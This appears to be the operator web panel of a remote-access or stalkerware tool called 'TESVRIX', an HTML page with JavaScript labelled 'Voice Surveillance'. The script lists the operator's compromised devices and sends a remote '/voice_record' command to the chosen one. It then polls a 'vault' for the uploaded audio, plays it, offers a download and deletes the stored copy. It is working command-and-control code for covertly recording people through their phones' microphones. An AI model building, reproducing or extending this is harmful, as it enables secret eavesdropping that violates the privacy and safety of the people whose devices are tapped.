<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TESVRIX · VOICE SURVEILLANCE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-glow: rgba(225, 29, 72, 0.45);
            --bg-deep: #020617;
            --bg-surface: #0f172a;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent-green: #10b981;
            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        body { background: radial-gradient(ellipse at 20% 30%, #0a0f1f, var(--bg-deep)); font-family: 'Inter', sans-serif; color: var(--text-primary); height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }

        .container {
            width: 100%;
            max-width: 500px;
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(225,29,72,0.05);
            animation: surv-card-glow 5s ease-in-out infinite;
        }

        @keyframes surv-card-glow {
            0%, 100% { box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(225,29,72,0.05); }
            50% { box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 25px rgba(225,29,72,0.08); }
        }

        .header h1 { font-family: 'Space Grotesk'; font-size: 1.4rem; letter-spacing: 2px; margin-bottom: 30px; color: var(--primary); }

        .recorder-box {
            background: rgba(0,0,0,0.3);
            border-radius: 24px;
            padding: 30px;
            margin-bottom: 20px;
        }

        .duration-input {
            width: 100%;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            color: #fff;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-family: 'Space Grotesk';
        }

        .btn-record {
            width: 100%;
            padding: 15px;
            border-radius: 15px;
            background: var(--primary);
            color: #fff;
            border: none;
            font-family: 'Space Grotesk';
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-record:hover { transform: translateY(-2px); box-shadow: 0 0 20px var(--primary-glow); }
        .btn-record:disabled { opacity: 0.5; cursor: not-allowed; }

        .status { margin-top: 20px; font-size: 0.8rem; color: var(--text-secondary); }

        .player-box {
            margin-top: 30px;
            display: none;
            background: rgba(16, 185, 129, 0.1);
            padding: 20px;
            border-radius: 20px;
            border: 1px solid var(--accent-green);
        }

        audio { width: 100%; margin-top: 10px; }

        .node-selector {
            width: 100%;
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
            color: #fff;
            padding: 10px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-family: 'Space Grotesk';
        }
    
        /* UNIVERSAL MOBILE RESPONSIVE FIX */
        @media (max-width: 992px) {
            body { padding: 10px; height: auto !important; min-height: 100vh; overflow-y: auto !important; }
            .container { backdrop-filter: none !important; -webkit-backdrop-filter: none !important; background-color: rgba(15, 23, 42, 0.98); }
            .dashboard, .cam-container, .main-card, .container, .app-container, .split-layout {
                flex-direction: column !important;
                height: auto !important;
                min-height: 100vh;
                width: 100% !important;
                max-width: 100% !important;
                margin: 0 !important;
                border-radius: 16px !important;
            }
            .device-panel, .detail-panel, .sidebar, .main-area, .view-area, .gallery, .split-left, .split-right, .left-panel, .right-panel {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                flex: none !important;
                min-height: 200px;
                border-right: none !important;
                border-bottom: 1px solid rgba(255,255,255,0.05);
            }
            .stats-grid, .perm-list, .grid-container {
                grid-template-columns: 1fr !important;
            }
            .header, .panel-header, .controls { 
                flex-wrap: wrap; 
                gap: 10px; 
            }
            .node-selector, .search-field { 
                width: 100% !important; 
                min-width: 100% !important;
            }
            .stat-tile { margin-bottom: 10px; }
        }

    
        /* PREMIUM SCROLLBAR */
        ::-webkit-scrollbar { width: 10px !important; height: 10px !important; }
        ::-webkit-scrollbar-track { background: rgba(2, 6, 23, 0.6) !important; border-radius: 10px !important; }
        ::-webkit-scrollbar-thumb { 
            background: #e11d48 !important; 
            border-radius: 10px !important; 
            border: 3px solid rgba(2, 6, 23, 0.6) !important; 
        }
        ::-webkit-scrollbar-thumb:hover { background: #f43f5e !important; }

    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-microphone-alt"></i> VOICE SURVEILLANCE</h1>
        </div>

        <select id="deviceSelector" class="node-selector"></select>

        <div class="recorder-box">
            <p style="font-size: 0.7rem; margin-bottom: 10px; color: var(--text-secondary);">RECORDING DURATION (SECONDS)</p>
            <input type="number" id="duration" class="duration-input" value="10" min="5" max="60">
            <button id="recordBtn" class="btn-record" onclick="startRemoteRecord()">
                <i class="fas fa-circle" id="recIcon"></i> START REMOTE RECORDING
            </button>
        </div>

        <div id="status" class="status">AWAITING COMMAND</div>

        <div id="playerBox" class="player-box">
            <p style="font-size: 0.7rem; font-weight: 700; color: var(--accent-green);">NEW RECORDING RECEIVED</p>
            <audio id="audioPlayer" controls></audio>
            <a id="downloadBtn" style="display: block; margin-top: 10px; font-size: 0.7rem; color: #fff; text-decoration: none; cursor: pointer;">
                <i class="fas fa-download"></i> DOWNLOAD 3GP
            </a>
        </div>
    </div>

    <script src="../davidkewebsitekemake300kespeedma/config.php"></script>
    <script>
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let selectedId = null;

        async function fetchDevices() {
            try {
                const r = await fetch(getApiUrl("devices?operator_id=eq." + auth.operator_id + "&order=last_seen.desc"), { headers: getApiHeaders() });
                const data = await r.json();
                const sel = document.getElementById('deviceSelector');
                sel.innerHTML = data.map(d => {
                    const lastSeen = new Date(d.last_seen).getTime();
                    const isOnline = (Date.now() - lastSeen) < 120000;
                    const statusDot = isOnline ? "🟢" : "🔴";
                    const statusText = isOnline ? "ONLINE" : "OFFLINE";
                    return `<option value="${d.device_uuid}" ${d.device_uuid === selectedId ? 'selected' : ''}>${statusDot} ${d.device_name || 'NODE'} [${statusText}]</option>`;
                }).join('');
                if (!selectedId && data[0]) selectedId = data[0].device_uuid;
            } catch (e) {}
        }

        async function startRemoteRecord() {
            if (!selectedId) return;
            const duration = document.getElementById('duration').value;
            const btn = document.getElementById('recordBtn');
            const icon = document.getElementById('recIcon');
            const status = document.getElementById('status');

            btn.disabled = true;
            icon.classList.add('fa-spin');
            status.innerText = "TRANSMITTING COMMAND...";

            try {
                const body = { device_uuid: selectedId, type: '/voice_record', status: 'pending', data: JSON.stringify({ duration: parseInt(duration) }), operator_id: auth.operator_id };
                await fetch(getApiUrl("commands"), { method: 'POST', headers: getApiHeaders(), body: JSON.stringify(body) });

                status.innerText = `RECORDING IN PROGRESS (${duration}s)...`;
                setTimeout(pollForResult, duration * 1000 + 1000);
            } catch (e) {
                status.innerText = "COMMAND FAILED";
                btn.disabled = false;
            }
        }

        async function pollForResult() {
            const status = document.getElementById('status');
            const btn = document.getElementById('recordBtn');
            const icon = document.getElementById('recIcon');

            status.innerText = "AWAITING AUDIO DATA...";
            const startTime = Date.now();

            let attempts = 0;
            const poll = setInterval(async () => {
                attempts++;
                try {
                    const r = await fetch(getApiUrl("vault?device_uuid=eq." + selectedId + "&type=eq.voice_record_data&order=created_at.desc&limit=1"), { headers: getApiHeaders() });
                    const data = await r.json();

                    if (data && data.length > 0) {
                        const entryTime = new Date(data[0].created_at).getTime();
                         // Only process if this recording was created after we sent the command
                        if (entryTime > startTime - 10000) {
                            clearInterval(poll);
                            showPlayer(data[0].content);
                            status.innerText = "RECORDING RECEIVED SUCCESSFULLY";
                            btn.disabled = false;
                            icon.classList.remove('fa-spin');

                             // Optional: Clean up after download to save space
                            fetch(getApiUrl("vault?id=eq." + data[0].id), {
                                method: 'DELETE',
                                headers: getApiHeaders()
                            });
                        }
                    }
                } catch (e) {
                    console.error("Poll error:", e);
                }

                if (attempts > 30) {
                    clearInterval(poll);
                    status.innerText = "TIMEOUT: NODE DID NOT UPLOAD DATA";
                    btn.disabled = false;
                    icon.classList.remove('fa-spin');
                }
            }, 1500);
        }

        function showPlayer(content) {
            const box = document.getElementById('playerBox');
            const player = document.getElementById('audioPlayer');
            const dl = document.getElementById('downloadBtn');

             // Handle both URL and direct Base64 content
            let url = content;
            if (content.startsWith('data:audio/wav;base64,')) {
                url = content;
            } else if (!content.startsWith('http') && content.length > 100) {
                url = 'data:audio/wav;base64,' + content;
            }

            box.style.display = 'block';
            player.src = url;
            dl.onclick = () => {
                const a = document.createElement('a');
                a.href = url;
                a.download = `SURV_VOICE_${Date.now()}.wav`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            };
        }

        fetchDevices();
         // Periodic Refresh for Device Status
        setInterval(fetchDevices, 10000);
    </script>
</body>
</html>
